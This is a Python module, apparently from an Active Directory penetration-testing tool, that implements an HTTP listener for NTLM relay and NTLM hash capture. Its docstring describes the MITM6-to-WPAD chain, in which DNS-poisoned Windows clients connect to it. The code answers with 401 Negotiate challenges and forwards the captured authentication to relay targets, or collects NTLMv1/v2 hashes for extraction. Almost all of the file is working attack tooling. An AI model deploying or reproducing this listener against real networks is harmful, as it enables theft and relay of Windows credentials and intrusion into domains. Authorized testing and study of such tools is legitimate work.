"""Async HTTP NTLM relay source.

Listens on configurable HTTP host/port (default ``0.0.0.0:80``) and
shepherds incoming Windows clients through a Negotiate / NTLM exchange,
relaying the captured authentication onward via the same
``RelayEngine`` pipeline used by ``SMBRelaySource`` and
``LDAPRelaySource``.

Designed for the MITM6 → WPAD attack chain: once a victim is poisoned
into using us as a DNS server, it resolves ``wpad`` and connects to
``http://wpad/wpad.dat`` (or ``http://wpadfakeserver.<domain>/...``).
This listener answers ``401 Unauthorized`` with ``WWW-Authenticate:
Negotiate`` and rides the SPNEGO/NTLM exchange through to the relay
target queue.

Architecture
------------
* The asyauth ``spnegorelay_ntlm_factory`` does all the protocol work
  (relay client to target, NTLM state machine, bookkeeping); we
  contribute only the HTTP transport glue: parse request, extract the
  ``Authorization: Negotiate`` blob, call
  ``gssapi.authenticate_relay_server(blob)``, base64-encode the
  returned challenge into ``WWW-Authenticate``.
* Each connection gets its own SPNEGORelay (factory style identical to
  ``SMBRelaySource``) so concurrent victims can be relayed
  independently.
* The factory side-effect is that as soon as NTLM is selected the
  SPNEGORelay puts itself into ``self._relay_queue`` via
  ``notify_relay()``; the inherited ``_bridge_relay_contexts`` then
  publishes ``RelayAuthentication`` events to ``auth_queue``.

What we deliberately do NOT do here:
* Serve real WPAD content — Windows discards the body once auth fails
  to land a useful proxy, so we send a 200 OK with an empty
  ``application/x-ns-proxy-autoconfig`` body.
* Implement full HTTP/1.1 — only the subset Windows clients use during
  Negotiate auth (no chunked, no keep-alive renegotiation logic).
"""

from __future__ import annotations

import asyncio
import base64
import contextlib
from collections.abc import Callable
from dataclasses import dataclass

from adscan_internal.rich_output import print_info, print_info_debug
from adscan_internal.services.relay.sources import (
    NativeRelaySource,
    RelaySourceConfig,
)


@dataclass(frozen=True)
class HTTPNtlmRelaySourceConfig(RelaySourceConfig):
    """Listener configuration for the HTTP NTLM relay source.

    Inherits ``listen_host``/``listen_port``/``protocol`` from the base.
    """

    listen_host: str = "0.0.0.0"
    listen_port: int = 80
    protocol: str = "http-ntlm"


# ---------------------------------------------------------------------------
# Pre-built HTTP responses (ASCII, fixed framing)
# ---------------------------------------------------------------------------

_401_NEGOTIATE = (
    b"HTTP/1.1 401 Unauthorized\r\n"
    b"WWW-Authenticate: Negotiate\r\n"
    b"Connection: keep-alive\r\n"
    b"Content-Length: 0\r\n"
    b"\r\n"
)

_200_WPAD = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Type: application/x-ns-proxy-autoconfig\r\n"
    b"Content-Length: 41\r\n"
    b"Connection: close\r\n"
    b"\r\n"
    b"function FindProxyForURL(u,h){return 'DIRECT';}"[:41]
)

_500_INTERNAL = (
    b"HTTP/1.1 500 Internal Server Error\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)


# ---------------------------------------------------------------------------
# Source
# ---------------------------------------------------------------------------

class HTTPNtlmRelaySource(NativeRelaySource):
    """HTTP listener that drives the SPNEGO/NTLM exchange and queues GSSAPI.

    The class follows the same ``NativeRelaySource`` pattern as
    ``SMBRelaySource``: ``_start_server`` returns a long-running task and
    ``_bridge_relay_contexts`` (inherited) publishes relay authentications.
    """

    protocol = "http-ntlm"

    def __init__(
        self,
        *,
        config: HTTPNtlmRelaySourceConfig,
        auth_queue,
        gssapi_factory: Callable[[], object] | None = None,
    ) -> None:
        super().__init__(config=config, auth_queue=auth_queue)
        self._gssapi_factory = gssapi_factory
        self._http_server: asyncio.Server | None = None

    async def _start_server(self) -> object:
        from badauth.protocols.ntlm.relay.native import ntlmrelay_factory  # noqa: PLC0415
        from badauth.protocols.spnego.relay.native import (  # noqa: PLC0415
            spnegorelay_ntlm_factory,
        )

        gssapi_factory = self._gssapi_factory or (
            lambda: spnegorelay_ntlm_factory(
                self._relay_queue, lambda: ntlmrelay_factory()
            )
        )

        async def _handle_connection(
            reader: asyncio.StreamReader, writer: asyncio.StreamWriter
        ) -> None:
            await self._handle_one_connection(reader, writer, gssapi_factory)

        self._http_server = await asyncio.start_server(
            _handle_connection,
            self.config.listen_host,
            self.config.listen_port,
        )
        print_info(
            f"HTTP NTLM relay listener ready — "
            f"{self.config.listen_host}:{self.config.listen_port}"
        )
        # Keep this coroutine alive — it is awaited as the source's server task.
        async with self._http_server:
            await self._http_server.serve_forever()
        return None

    async def _handle_one_connection(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        gssapi_factory: Callable[[], object],
    ) -> None:
        """Thin shim — delegate to the module-level handler so capture-mode reuses it."""

        await _drive_ntlm_over_http(reader, writer, gssapi_factory)

    # -- helpers (kept as static methods for backwards-compat) -----------

    @staticmethod
    def _build_401_challenge(b64_challenge: str) -> bytes:
        return _build_401_challenge(b64_challenge)

    @staticmethod
    async def _read_request(
        reader: asyncio.StreamReader,
    ) -> tuple[str, str, dict[str, str], bytes] | None:
        """Backwards-compat shim — delegate to module-level ``_read_request``."""

        return await _read_request(reader)

    async def stop(self) -> None:
        if self._http_server is not None:
            self._http_server.close()
            with contextlib.suppress(Exception):
                await self._http_server.wait_closed()
            self._http_server = None
        await super().stop()


def _decode_auth_blob(auth_header: str) -> bytes | None:
    """Extract raw Negotiate / NTLM blob bytes from an Authorization header."""

    if not auth_header:
        return None
    parts = auth_header.split(None, 1)
    if len(parts) != 2:
        return None
    scheme, b64 = parts
    if scheme.lower() not in ("negotiate", "ntlm"):
        return None
    try:
        return base64.b64decode(b64.strip())
    except Exception:  # noqa: BLE001
        return None


def _build_401_challenge(b64_challenge: str) -> bytes:
    """Build a 401 Unauthorized response carrying the NTLM challenge blob."""

    return (
        b"HTTP/1.1 401 Unauthorized\r\n"
        b"WWW-Authenticate: Negotiate "
        + b64_challenge.encode("ascii")
        + b"\r\n"
        b"Connection: keep-alive\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n"
    )


async def _read_request(
    reader: asyncio.StreamReader,
) -> tuple[str, str, dict[str, str], bytes] | None:
    """Read one HTTP/1.1 request; return ``(method, path, headers, body)``."""

    try:
        raw_head = await asyncio.wait_for(
            reader.readuntil(b"\r\n\r\n"), timeout=30.0
        )
    except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError):
        return None

    text = raw_head.decode("iso-8859-1", errors="replace")
    lines = text.split("\r\n")
    if not lines:
        return None
    request_line_parts = lines[0].split(" ", 2)
    if len(request_line_parts) < 2:
        return None
    method = request_line_parts[0]
    path = request_line_parts[1]

    headers: dict[str, str] = {}
    for line in lines[1:]:
        if ":" not in line:
            continue
        name, _, value = line.partition(":")
        headers[name.strip().lower()] = value.strip()

    length_str = headers.get("content-length", "0") or "0"
    try:
        length = int(length_str)
    except ValueError:
        length = 0
    body = b""
    if length > 0:
        with contextlib.suppress(Exception):
            body = await asyncio.wait_for(
                reader.readexactly(length), timeout=10.0
            )
    return method, path, headers, body


async def _drive_ntlm_over_http(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    gssapi_factory: Callable[[], object],
) -> None:
    """Drive Negotiate/NTLM through one HTTP/1.1 connection.

    Same logic for relay and capture mode — the only difference is which
    GSSAPI server the factory produces.
    """

    peer = writer.get_extra_info("peername", ("?", 0))
    peer_ip = peer[0] if peer else "?"

    gssapi: object | None = None
    try:
        while True:
            request = await _read_request(reader)
            if request is None:
                return  # client disconnected
            method, path, headers, _body = request
            print_info_debug(
                f"[http-ntlm] {peer_ip} {method} {path} "
                f"(auth={'Y' if 'authorization' in headers else 'N'})"
            )

            blob = _decode_auth_blob(headers.get("authorization", ""))
            if blob is None:
                writer.write(_401_NEGOTIATE)
                await writer.drain()
                continue

            if gssapi is None:
                gssapi = gssapi_factory()

            challenge_or_done, to_continue, err = await gssapi.authenticate_relay_server(blob)  # type: ignore[union-attr]
            if err is not None:
                print_info_debug(
                    f"[http-ntlm] auth error from {peer_ip}: {err}"
                )
                writer.write(_500_INTERNAL)
                await writer.drain()
                return

            if to_continue and challenge_or_done is not None:
                encoded = base64.b64encode(challenge_or_done).decode("ascii")
                writer.write(_build_401_challenge(encoded))
                await writer.drain()
                continue

            # AUTHENTICATE consumed → relay/capture completed.
            writer.write(_200_WPAD)
            await writer.drain()
            return
    except (asyncio.IncompleteReadError, ConnectionError, asyncio.TimeoutError):
        return
    except Exception as exc:  # noqa: BLE001
        print_info_debug(f"[http-ntlm] {peer_ip} unexpected error: {exc}")
        with contextlib.suppress(Exception):
            writer.write(_500_INTERNAL)
            await writer.drain()
    finally:
        with contextlib.suppress(Exception):
            writer.close()
            await writer.wait_closed()


# ---------------------------------------------------------------------------
# Capture-mode source — twin of SMBNtlmCaptureSource
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class HTTPNtlmCaptureConfig:
    """Configuration for the standalone NTLM hash capture HTTP listener."""

    listen_host: str = "0.0.0.0"
    listen_port: int = 80


class HTTPNtlmCaptureSource:
    """Capture NTLMv1/v2 hashes over HTTP without needing a relay target.

    Mirrors ``SMBNtlmCaptureSource``: an async ``start() / stop()`` pair
    plus a caller-supplied ``asyncio.Queue`` that receives the completed
    GSSAPI context once the NTLM AUTHENTICATE has been processed.

    Internally it reuses ``HTTPNtlmRelaySource``'s HTTP request parser
    via a private subclass that swaps the relay GSSAPI factory for a
    standalone ``SPNEGOserver`` + ``NTLMServerNative`` (the same building
    blocks ``smb_ntlm_capture`` uses).  Hash extraction is exposed via
    ``smb_ntlm_capture.extract_ntlm_hash`` since the wire result is
    identical regardless of transport.

    Usage::

        queue: asyncio.Queue[object] = asyncio.Queue()
        source = HTTPNtlmCaptureSource(
            HTTPNtlmCaptureConfig(listen_host="0.0.0.0"), queue
        )
        await source.start()
        try:
            gssapi = await asyncio.wait_for(queue.get(), timeout=120.0)
            result = extract_ntlm_hash(gssapi)
        finally:
            await source.stop()
    """

    def __init__(
        self,
        config: HTTPNtlmCaptureConfig,
        capture_queue: asyncio.Queue,
    ) -> None:
        self._config = config
        self._capture_queue = capture_queue
        self._http_server: asyncio.Server | None = None
        self._serve_task: asyncio.Task[None] | None = None

    async def start(self) -> None:
        """Bind the HTTP listener and start serving."""

        gssapi_factory = self._build_capture_factory()

        async def _handle_connection(
            reader: asyncio.StreamReader, writer: asyncio.StreamWriter
        ) -> None:
            await _drive_ntlm_over_http(reader, writer, gssapi_factory)

        self._http_server = await asyncio.start_server(
            _handle_connection,
            self._config.listen_host,
            self._config.listen_port,
        )
        print_info(
            f"HTTP NTLM capture listener ready — "
            f"{self._config.listen_host}:{self._config.listen_port}"
        )
        self._serve_task = asyncio.create_task(self._http_server.serve_forever())

    async def stop(self) -> None:
        """Stop the listener (best-effort)."""

        if self._serve_task is not None:
            self._serve_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await self._serve_task
            self._serve_task = None
        if self._http_server is not None:
            self._http_server.close()
            with contextlib.suppress(Exception):
                await self._http_server.wait_closed()
            self._http_server = None

    # -- internals ------------------------------------------------------

    def _build_capture_factory(self) -> Callable[[], object]:
        """Produce per-connection ``SPNEGOserver`` adapters.

        Each connection gets its own GSSAPI server so concurrent victims
        do not corrupt each other's NTLM state.
        """

        from badauth.common.constants import asyauthSecret  # noqa: PLC0415
        from badauth.common.credentials.ntlm import NTLMCredential  # noqa: PLC0415
        from badauth.protocols.ntlm.server.native import NTLMServerNative  # noqa: PLC0415
        from badauth.protocols.spnego.server.native import SPNEGOserver  # noqa: PLC0415

        from adscan_internal.services.relay.smb_ntlm_capture import (  # noqa: PLC0415
            _SPNEGOCaptureAdapter,
        )

        capture_queue = self._capture_queue

        def _factory() -> object:
            cred = NTLMCredential(
                secret="", username="", domain="", stype=asyauthSecret.PASSWORD
            )
            ntlm_server = NTLMServerNative(cred)
            inner = SPNEGOserver(capture_queue)
            inner.add_auth_context(
                "NTLMSSP - Microsoft NTLM Security Support Provider", ntlm_server
            )
            return _SPNEGOCaptureAdapter(capture_queue, inner)

        return _factory


__all__ = [
    "HTTPNtlmCaptureConfig",
    "HTTPNtlmCaptureSource",
    "HTTPNtlmRelaySource",
    "HTTPNtlmRelaySourceConfig",
]
